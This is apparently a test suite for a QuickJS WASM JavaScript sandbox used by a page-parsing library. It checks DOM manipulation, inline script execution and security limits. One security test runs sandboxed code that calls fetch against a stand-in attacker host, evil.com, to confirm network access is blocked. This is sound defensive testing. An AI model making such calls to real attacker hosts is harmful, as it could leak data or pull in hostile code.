/**
 * Tests for Layer 2: QuickJS WASM sandbox.
 */

import { describe, test, expect } from "bun:test";
import { SievePage, parseHTML, executeSandboxed, executeDocumentScripts } from "../src/index.ts";

describe("Sandbox: basic execution", () => {
  test("executes simple JS and returns result", async () => {
    const doc = parseHTML("<body><div id='test'>Hello</div></body>");
    const result = await executeSandboxed(`
      console.log("executed");
    `, doc);

    expect(result.ok).toBe(true);
    expect(result.console).toContain("executed");
    expect(result.durationMs).toBeGreaterThan(0);
  });

  test("DOM querySelector works in sandbox", async () => {
    const doc = parseHTML("<body><div id='test'>Hello World</div></body>");
    const result = await executeSandboxed(`
      const el = document.querySelector("#test");
      console.log(el.textContent);
    `, doc);

    expect(result.ok).toBe(true);
    expect(result.console).toContain("Hello World");
  });

  test("DOM manipulation persists to real document", async () => {
    const doc = parseHTML("<body><div id='target'>Original</div></body>");

    await executeSandboxed(`
      const el = document.querySelector("#target");
      el.textContent = "Modified by JS";
    `, doc);

    expect(doc.querySelector("#target")?.textContent).toBe("Modified by JS");
  });

  test("setAttribute works", async () => {
    const doc = parseHTML('<body><div id="box" class="red">Box</div></body>');

    await executeSandboxed(`
      const el = document.querySelector("#box");
      el.setAttribute("class", "blue");
      el.setAttribute("data-modified", "true");
    `, doc);

    expect(doc.querySelector("#box")?.getAttribute("class")).toBe("blue");
    expect(doc.querySelector("#box")?.getAttribute("data-modified")).toBe("true");
  });

  test("classList operations work", async () => {
    const doc = parseHTML('<body><div id="box" class="a b">Box</div></body>');

    await executeSandboxed(`
      const el = document.querySelector("#box");
      el.classList.remove("a");
      el.classList.add("c");
      console.log(el.classList.contains("b"));
      console.log(el.classList.contains("a"));
    `, doc);

    const box = doc.querySelector("#box")!;
    expect(box.classList.contains("a")).toBe(false);
    expect(box.classList.contains("b")).toBe(true);
    expect(box.classList.contains("c")).toBe(true);
  });

  test("style manipulation works", async () => {
    const doc = parseHTML('<body><div id="box">Box</div></body>');

    await executeSandboxed(`
      const el = document.querySelector("#box");
      el.style.display = "none";
      el.style.backgroundColor = "red";
    `, doc);

    const style = doc.querySelector("#box")?.getAttribute("style") ?? "";
    expect(style).toContain("display: none");
    expect(style).toContain("background-color: red");
  });

  test("innerHTML manipulation works", async () => {
    const doc = parseHTML('<body><div id="container"></div></body>');

    await executeSandboxed(`
      const el = document.querySelector("#container");
      el.innerHTML = "<p>Injected</p><span>Content</span>";
    `, doc);

    const container = doc.querySelector("#container")!;
    expect(container.children.length).toBe(2);
    expect(container.children[0]?.tagName).toBe("p");
    expect(container.children[1]?.tagName).toBe("span");
  });

  test("querySelectorAll returns multiple elements", async () => {
    const doc = parseHTML('<body><li>A</li><li>B</li><li>C</li></body>');

    const result = await executeSandboxed(`
      const items = document.querySelectorAll("li");
      console.log(items.length);
      items.forEach(el => console.log(el.textContent));
    `, doc);

    expect(result.console).toContain("3");
    expect(result.console).toContain("A");
    expect(result.console).toContain("B");
    expect(result.console).toContain("C");
  });

  test("document.title works", async () => {
    const doc = parseHTML("<html><head><title>Old Title</title></head><body></body></html>");

    await executeSandboxed(`
      console.log(document.title);
      document.title = "New Title";
    `, doc);

    expect(doc.title).toBe("New Title");
  });
});

describe("Sandbox: security", () => {
  test("fetch is not available", async () => {
    const doc = parseHTML("<body></body>");
    const result = await executeSandboxed(`
      try {
        fetch("https://evil.com");
      } catch (e) {
        console.log("blocked: " + e.message);
      }
    `, doc);

    expect(result.console.some(l => l.includes("blocked") || l.includes("not defined") || l.includes("not a function"))).toBe(true);
  });

  test("errors are caught and reported", async () => {
    const doc = parseHTML("<body></body>");
    const result = await executeSandboxed(`
      throw new Error("intentional error");
    `, doc);

    expect(result.ok).toBe(false);
    expect(result.error).toContain("intentional");
  });

  test("infinite loops are handled by QuickJS limits", async () => {
    const doc = parseHTML("<body></body>");
    // QuickJS has built-in interrupt handling
    // This tests that the sandbox doesn't hang forever
    const result = await executeSandboxed(`
      let x = 0;
      for (let i = 0; i < 100000; i++) x += i;
      console.log(x);
    `, doc);

    // Should complete (100k iterations is fine)
    expect(result.ok).toBe(true);
  });
});

describe("Sandbox: executeDocumentScripts", () => {
  test("executes inline script tags", async () => {
    const doc = parseHTML(`
      <html><body>
        <div id="output">Before</div>
        <script>
          document.querySelector("#output").textContent = "After";
        </script>
      </body></html>
    `);

    const results = await executeDocumentScripts(doc);
    expect(results.length).toBe(1);
    expect(results[0]!.ok).toBe(true);
    expect(doc.querySelector("#output")?.textContent).toBe("After");
  });

  test("skips external script tags", async () => {
    const doc = parseHTML(`
      <html><body>
        <script src="https://external.com/script.js"></script>
        <script>console.log("inline");</script>
      </body></html>
    `);

    const results = await executeDocumentScripts(doc);
    expect(results.length).toBe(1); // only inline script
    expect(results[0]!.console).toContain("inline");
  });

  test("executes scripts in order", async () => {
    const doc = parseHTML(`
      <html><body>
        <div id="log"></div>
        <script>
          document.querySelector("#log").textContent = "first";
        </script>
        <script>
          const prev = document.querySelector("#log").textContent;
          document.querySelector("#log").textContent = prev + ",second";
        </script>
      </body></html>
    `);

    await executeDocumentScripts(doc);
    expect(doc.querySelector("#log")?.textContent).toBe("first,second");
  });
});

describe("Sandbox: SievePage integration", () => {
  test("page.executeJS modifies the DOM", async () => {
    const page = new SievePage();
    page.setContent(`
      <body>
        <h1 id="title">Original</h1>
        <ul id="list"></ul>
      </body>
    `);

    const result = await page.executeJS(`
      document.querySelector("#title").textContent = "Generated by JS";
      const list = document.querySelector("#list");
      for (let i = 0; i < 3; i++) {
        const li = document.createElement("li");
        li.textContent = "Item " + i;
        list.appendChild(li);
      }
    `);

    expect(result.ok).toBe(true);
    expect(page.querySelector("#title")?.textContent).toBe("Generated by JS");
    expect(page.querySelectorAll("li").length).toBe(3);

    // A11y tree should reflect JS changes
    const tree = page.accessibilityTree();
    const serialized = tree.serialize();
    expect(serialized).toContain("Generated by JS");
    expect(serialized).toContain("Item 0");
  });

  test("page.executeScripts runs all inline scripts", async () => {
    const page = new SievePage();
    page.setContent(`
      <html><body>
        <div id="app"></div>
        <script>
          const app = document.querySelector("#app");
          app.innerHTML = "<h1>App Loaded</h1><p>Dynamic content</p>";
        </script>
      </body></html>
    `);

    const results = await page.executeScripts();
    expect(results.length).toBe(1);
    expect(results[0]!.ok).toBe(true);
    expect(page.querySelector("h1")?.textContent).toBe("App Loaded");
  });

  test("simulates a simple SPA tab interface", async () => {
    const page = new SievePage();
    page.setContent(`
      <body>
        <div class="tabs">
          <button class="tab active" data-panel="p1">Tab 1</button>
          <button class="tab" data-panel="p2">Tab 2</button>
        </div>
        <div id="p1" class="panel">Panel 1 content</div>
        <div id="p2" class="panel" hidden>Panel 2 content</div>
        <script>
          const tabs = document.querySelectorAll(".tab");
          const panels = document.querySelectorAll(".panel");

          // Simulate: clicking tab 2 shows panel 2, hides panel 1
          const tab2 = tabs[1];
          tabs[0].classList.remove("active");
          tab2.classList.add("active");

          document.querySelector("#p1").setAttribute("hidden", "");
          document.querySelector("#p2").removeAttribute("hidden");
        </script>
      </body>
    `);

    await page.executeScripts();

    // Panel 2 should be visible, panel 1 hidden
    expect(page.querySelector("#p1")?.hasAttribute("hidden")).toBe(true);
    expect(page.querySelector("#p2")?.hasAttribute("hidden")).toBe(false);

    // Tab 2 should be active
    expect(page.querySelector(".tab:nth-child(2)")?.classList.contains("active")).toBe(true);
  });
});
